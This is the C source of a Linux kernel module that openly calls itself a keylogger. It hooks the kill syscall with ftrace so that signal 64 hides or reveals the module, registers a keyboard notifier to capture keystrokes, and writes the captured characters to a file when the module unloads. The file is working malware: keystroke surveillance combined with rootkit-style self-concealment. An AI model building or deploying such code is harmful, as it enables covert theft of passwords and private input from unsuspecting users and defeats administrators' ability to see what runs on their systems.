#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/file.h>

#include "includes/headers.h"
#include "includes/ftrace_help.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wizarddos");
MODULE_DESCRIPTION("Keylogger");
MODULE_VERSION("0.01");

static short hid = 0 ;

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs){

        int sig = (int) regs -> si;
        if(sig == 64 && hid == 0){
                printk(KERN_INFO "Hiding module!\n");
                hid = 1;
                hideme();
                return 0;
        }
        else if(sig == 64 && hid == 1){
                printk(KERN_INFO "Showing module!\n");
                hid = 0 ;
                showme();
                return 0;
        }


        return orig_kill(regs);
}
#endif

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init keyboard_init(void) {

 	int err = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
  	if(err)
		return err;

	printk(KERN_INFO "Keyboard driver loaded.\n");
    	register_keyboard_notifier(&nb);
	
   return 0;
}

static void __exit keyboard_exit(void) {
    unregister_keyboard_notifier(&nb);
    if(strlen(queued_chars) > 0){
        size_t len = write_to_file(queued_chars);
        if(len < 0){
            printk(KERN_DEBUG "Failed to save to the buffer");
        }
    }
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "Keyboard driver unloaded.\n");
}

module_init(keyboard_init);
module_exit(keyboard_exit);
